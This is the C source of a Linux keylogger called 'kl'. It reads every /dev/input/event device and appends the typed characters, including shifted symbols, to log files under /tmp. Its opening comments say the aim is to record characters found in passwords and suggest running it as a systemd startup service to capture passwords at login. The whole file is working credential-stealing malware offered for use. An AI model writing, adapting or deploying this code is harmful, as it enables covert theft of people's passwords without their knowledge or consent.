// BRIEF
//
// kl logs alphanumeric keys, as well as symbol keys accessible from a
// keyboard with US keyboard layout by pressing shift in combination with the
// alphanumeric keys, or symbol keys adjacent to alphanumeric keys (but not
// including the function keys). Newlines and whitespace are logged too.
//
// A full list of logged keys can be found in the enum and compound literal,
// but the idea is to log characters found in passwords. When run as a
// systemd startup service, kl can be used to log passwords at login.
//
// ADD NEW KEYS
//
// To add new keys, moodify the enum below, as well as the two compound
// literals.
//
// COMPILE
//
// gcc -o kl kl.c 
//
// RUN
//
// ./kl

#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#define NUM_CODES 74

enum code {
	e_key_esc,
	e_key_1,
	e_key_2,
	e_key_3,
	e_key_4,
	e_key_5,
	e_key_6,
	e_key_7,
	e_key_8,
	e_key_9,
	e_key_0,
	e_key_minus,
	e_key_equal,
	e_key_backspace,
	e_key_tab,
	e_key_q,
	e_key_w,
	e_key_e,
	e_key_r,
	e_key_t,
	e_key_y,
	e_key_u,
	e_key_i,
	e_key_o,
	e_key_p,
	e_key_leftbrace,
	e_key_rightbrace,
	e_key_enter,
	e_key_a,
	e_key_s,
	e_key_d,
	e_key_f,
	e_key_g,
	e_key_h,
	e_key_j,
	e_key_k,
	e_key_l,
	e_key_semicolon,
	e_key_apostrophe,
	e_key_grave,
	e_key_leftshift,
	e_key_backslash,
	e_key_z,
	e_key_x,
	e_key_c,
	e_key_v,
	e_key_b,
	e_key_n,
	e_key_m,
	e_key_comma,
	e_key_dot,
	e_key_slash,
	e_key_rightshift,
	e_key_kpasterisk,
	e_key_space,
	e_key_capslock,
	e_key_kp7,
	e_key_kp8,
	e_key_kp9,
	e_key_kpminus,
	e_key_kp4,
	e_key_kp5,
	e_key_kp6,
	e_key_kpplus,
	e_key_kp1,
	e_key_kp2,
	e_key_kp3,
	e_key_kp0,
	e_key_kpdot,
	e_key_kpenter,
	e_key_kpslash,
	e_key_linefeed,
	e_key_kpequal,
	e_key_kpcomma,
};

#define code_map /**/ \
(const unsigned[NUM_CODES]) { \
	[e_key_esc] = KEY_ESC, \
	[e_key_1] = KEY_1, \
	[e_key_2] = KEY_2, \
	[e_key_3] = KEY_3, \
	[e_key_4] = KEY_4, \
	[e_key_5] = KEY_5, \
	[e_key_6] = KEY_6, \
	[e_key_7] = KEY_7, \
	[e_key_8] = KEY_8, \
	[e_key_9] = KEY_9, \
	[e_key_0] = KEY_0, \
	[e_key_minus] = KEY_MINUS, \
	[e_key_equal] = KEY_EQUAL, \
	[e_key_backspace] = KEY_BACKSPACE, \
	[e_key_tab] = KEY_TAB, \
	[e_key_q] = KEY_Q, \
	[e_key_w] = KEY_W, \
	[e_key_e] = KEY_E, \
	[e_key_r] = KEY_R, \
	[e_key_t] = KEY_T, \
	[e_key_y] = KEY_Y, \
	[e_key_u] = KEY_U, \
	[e_key_i] = KEY_I, \
	[e_key_o] = KEY_O, \
	[e_key_p] = KEY_P, \
	[e_key_leftbrace] = KEY_LEFTBRACE, \
	[e_key_rightbrace] = KEY_RIGHTBRACE, \
	[e_key_enter] = KEY_ENTER, \
	[e_key_a] = KEY_A, \
	[e_key_s] = KEY_S, \
	[e_key_d] = KEY_D, \
	[e_key_f] = KEY_F, \
	[e_key_g] = KEY_G, \
	[e_key_h] = KEY_H, \
	[e_key_j] = KEY_J, \
	[e_key_k] = KEY_K, \
	[e_key_l] = KEY_L, \
	[e_key_semicolon] = KEY_SEMICOLON, \
	[e_key_apostrophe] = KEY_APOSTROPHE, \
	[e_key_grave] = KEY_GRAVE, \
	[e_key_leftshift] = KEY_LEFTSHIFT, \
	[e_key_backslash] = KEY_BACKSLASH, \
	[e_key_z] = KEY_Z, \
	[e_key_x] = KEY_X, \
	[e_key_c] = KEY_C, \
	[e_key_v] = KEY_V, \
	[e_key_b] = KEY_B, \
	[e_key_n] = KEY_N, \
	[e_key_m] = KEY_M, \
	[e_key_comma] = KEY_COMMA, \
	[e_key_dot] = KEY_DOT, \
	[e_key_slash] = KEY_SLASH, \
	[e_key_rightshift] = KEY_RIGHTSHIFT, \
	[e_key_kpasterisk] = KEY_KPASTERISK, \
	[e_key_space] = KEY_SPACE, \
	[e_key_capslock] = KEY_CAPSLOCK, \
	[e_key_kp7] = KEY_KP7, \
	[e_key_kp8] = KEY_KP8, \
	[e_key_kp9] = KEY_KP9, \
	[e_key_kpminus] = KEY_KPMINUS, \
	[e_key_kp4] = KEY_KP4, \
	[e_key_kp5] = KEY_KP5, \
	[e_key_kp6] = KEY_KP6, \
	[e_key_kpplus] = KEY_KPPLUS, \
	[e_key_kp1] = KEY_KP1, \
	[e_key_kp2] = KEY_KP2, \
	[e_key_kp3] = KEY_KP3, \
	[e_key_kp0] = KEY_KP0, \
	[e_key_kpdot] = KEY_KPDOT, \
	[e_key_kpenter] = KEY_KPENTER, \
	[e_key_kpslash] = KEY_KPSLASH, \
	[e_key_linefeed] = KEY_LINEFEED, \
	[e_key_kpequal] = KEY_KPEQUAL, \
	[e_key_kpcomma] = KEY_KPCOMMA, \
}

#define name_map /**/ \
(char const*const[NUM_CODES]) { \
	[e_key_esc] = "KEY_ESC", \
	[e_key_1] = "1", \
	[e_key_2] = "2", \
	[e_key_3] = "3", \
	[e_key_4] = "4", \
	[e_key_5] = "5", \
	[e_key_6] = "6", \
	[e_key_7] = "7", \
	[e_key_8] = "8", \
	[e_key_9] = "9", \
	[e_key_0] = "0", \
	[e_key_minus] = "-", \
	[e_key_equal] = "=", \
	[e_key_backspace] = "\b", \
	[e_key_tab] = "\t", \
	[e_key_q] = "q", \
	[e_key_w] = "w", \
	[e_key_e] = "e", \
	[e_key_r] = "r", \
	[e_key_t] = "t", \
	[e_key_y] = "y", \
	[e_key_u] = "u", \
	[e_key_i] = "i", \
	[e_key_o] = "o", \
	[e_key_p] = "p", \
	[e_key_leftbrace] = "[", \
	[e_key_rightbrace] = "]", \
	[e_key_enter] = "\n", \
	[e_key_a] = "a", \
	[e_key_s] = "s", \
	[e_key_d] = "d", \
	[e_key_f] = "f", \
	[e_key_g] = "g", \
	[e_key_h] = "h", \
	[e_key_j] = "j", \
	[e_key_k] = "k", \
	[e_key_l] = "l", \
	[e_key_semicolon] = ";", \
	[e_key_apostrophe] = "'", \
	[e_key_grave] = "`", \
	[e_key_leftshift] = "", \
	[e_key_backslash] = "\\", \
	[e_key_z] = "z", \
	[e_key_x] = "x", \
	[e_key_c] = "c", \
	[e_key_v] = "v", \
	[e_key_b] = "b", \
	[e_key_n] = "n", \
	[e_key_m] = "m", \
	[e_key_comma] = ",", \
	[e_key_dot] = ".", \
	[e_key_slash] = "/", \
	[e_key_rightshift] = "", \
	[e_key_kpasterisk] = "*", \
	[e_key_space] = " ", \
	[e_key_capslock] = "", \
	[e_key_kp7] = "7", \
	[e_key_kp8] = "8", \
	[e_key_kp9] = "9", \
	[e_key_kpminus] = "-", \
	[e_key_kp4] = "4", \
	[e_key_kp5] = "5", \
	[e_key_kp6] = "6", \
	[e_key_kpplus] = "+", \
	[e_key_kp1] = "1", \
	[e_key_kp2] = "2", \
	[e_key_kp3] = "3", \
	[e_key_kp0] = "0", \
	[e_key_kpdot] = ".", \
	[e_key_kpenter] = "\n", \
	[e_key_kpslash] = "/", \
	[e_key_linefeed] = "\n", \
	[e_key_kpequal] = "=", \
	[e_key_kpcomma] = ",", \
}

// We only care about symbols that could appear in passwords. 
#define shift_name_map /**/ \
(char const*const[NUM_CODES]) { \
	[e_key_esc] = "KEY_ESC", \
	[e_key_1] = "!", \
	[e_key_2] = "@", \
	[e_key_3] = "#", \
	[e_key_4] = "$", \
	[e_key_5] = "%", \
	[e_key_6] = "^", \
	[e_key_7] = "&", \
	[e_key_8] = "*", \
	[e_key_9] = "(", \
	[e_key_0] = ")", \
	[e_key_minus] = "_", \
	[e_key_equal] = "+", \
	[e_key_backspace] = "\b", \
	[e_key_tab] = "\t", \
	[e_key_q] = "Q", \
	[e_key_w] = "W", \
	[e_key_e] = "E", \
	[e_key_r] = "R", \
	[e_key_t] = "T", \
	[e_key_y] = "Y", \
	[e_key_u] = "U", \
	[e_key_i] = "I", \
	[e_key_o] = "O", \
	[e_key_p] = "P", \
	[e_key_leftbrace] = "{", \
	[e_key_rightbrace] = "}", \
	[e_key_enter] = "\n", \
	[e_key_a] = "A", \
	[e_key_s] = "S", \
	[e_key_d] = "D", \
	[e_key_f] = "F", \
	[e_key_g] = "G", \
	[e_key_h] = "H", \
	[e_key_j] = "J", \
	[e_key_k] = "K", \
	[e_key_l] = "L", \
	[e_key_semicolon] = ":", \
	[e_key_apostrophe] = "\"", \
	[e_key_grave] = "~", \
	[e_key_leftshift] = "", \
	[e_key_backslash] = "|", \
	[e_key_z] = "Z", \
	[e_key_x] = "X", \
	[e_key_c] = "C", \
	[e_key_v] = "V", \
	[e_key_b] = "B", \
	[e_key_n] = "N", \
	[e_key_m] = "M", \
	[e_key_comma] = "<", \
	[e_key_dot] = ">", \
	[e_key_slash] = "?", \
	[e_key_rightshift] = "", \
	[e_key_kpasterisk] = "*", \
	[e_key_space] = " ", \
	[e_key_capslock] = "", \
	[e_key_kp7] = "7", \
	[e_key_kp8] = "8", \
	[e_key_kp9] = "9", \
	[e_key_kpminus] = "-", \
	[e_key_kp4] = "4", \
	[e_key_kp5] = "5", \
	[e_key_kp6] = "6", \
	[e_key_kpplus] = "+", \
	[e_key_kp1] = "1", \
	[e_key_kp2] = "2", \
	[e_key_kp3] = "3", \
	[e_key_kp0] = "0", \
	[e_key_kpdot] = ".", \
	[e_key_kpenter] = "\n", \
	[e_key_kpslash] = "/", \
	[e_key_linefeed] = "\n", \
	[e_key_kpequal] = "=", \
	[e_key_kpcomma] = ",", \
}

// Arbitrary limits that usually work.
#define MAX_NUM_DEVS 512
#define MAX_PATH_SIZE 256

int main(int argc, char **argv) {

    // Device file descriptor array.
    int dev_fd[MAX_NUM_DEVS] = {0};

    // Output file descriptor array.
    int out_fd[MAX_NUM_DEVS] = {0};

    // Device file path array. 
    char dev_path[MAX_NUM_DEVS][MAX_PATH_SIZE] = {0};

    // Output file path array.
    char out_path[MAX_NUM_DEVS][MAX_PATH_SIZE] = {0};

    // We don't know what the device path is, but we know it looks like
    // /dev/input/eventZ, where Z is an integer that is commonly between
    // 0 and 256, but can be higher if there are many devices, according
    // to some. We picked MAX_NUm_DEVS to be large enough to try them all.
    for (unsigned dev_idx = 0; dev_idx < MAX_NUM_DEVS; ++dev_idx) {

        // Form the device file path.
        snprintf(dev_path[dev_idx], MAX_PATH_SIZE,
                 "/dev/input/event%u", dev_idx);

        if (!access(dev_path[dev_idx], F_OK)) {
            // If the device file exists...

            // Open the device file for reading without blocking.
            dev_fd[dev_idx] = open(dev_path[dev_idx], O_RDONLY | O_NONBLOCK);

            // Form the output file path.
            snprintf(out_path[dev_idx], MAX_PATH_SIZE,
                     "/tmp/event%u.log", dev_idx);

            // Open the output file.
            out_fd[dev_idx] =
                    open(out_path[dev_idx], O_WRONLY|O_CREAT|O_APPEND);
        }
    }

    // This flag is zero iff shift is currently held down for a given device.
    int shift[MAX_NUM_DEVS] = {0};

    // Loop forever.
    for (;;) {  
        for (unsigned dev_idx = 0; dev_idx < MAX_NUM_DEVS; ++dev_idx) {
            if (dev_fd[dev_idx]) {
                // If the device file exists...

                // Define our input_event struct, and zero it. The input_event type is
                // defined in <linux/input.h> and friends.
                struct input_event ev = {0};

                // Read the next input event from the device file, without blocking.
                ssize_t num_read =
                        read(dev_fd[dev_idx], &ev, sizeof(struct input_event));

                // Skip to the next device without doing anything if nothing was
                // there to read yet.
                if (num_read <= 0) {
                    continue;
                }

                // Only act on keyboard events. The types of events are defined in
                // <linux/input.h> and friends.
                if (ev.type == EV_KEY) {
                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                        // If this keyboard event is for a shift key, set our shift
                        // variable. Set it to 1 if shift is being pressed, and to
                        // 0 if shift is being released.
                        shift[dev_idx] = ev.value == 1;
                    } else if (ev.value == 1 || ev.value == 2) {
                        // Otherwise, if this keyboard event is for a depress (1) or a
                        // continued depress (2), search for the matchine key code, and
                        // write the corresponding string (including the terminating
                        // null byte) to our output file.
                        for (unsigned code = 0; code < NUM_CODES; ++code) {
                            if (code_map[code] == ev.code) {

                                // Use the appropriate string, depending on
                                // whether the shift key is being held or not.
                                const char* str = shift[dev_idx]
                                        ? shift_name_map[code]
                                        : name_map[code];

                                write(out_fd[dev_idx], str, 2);
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
}
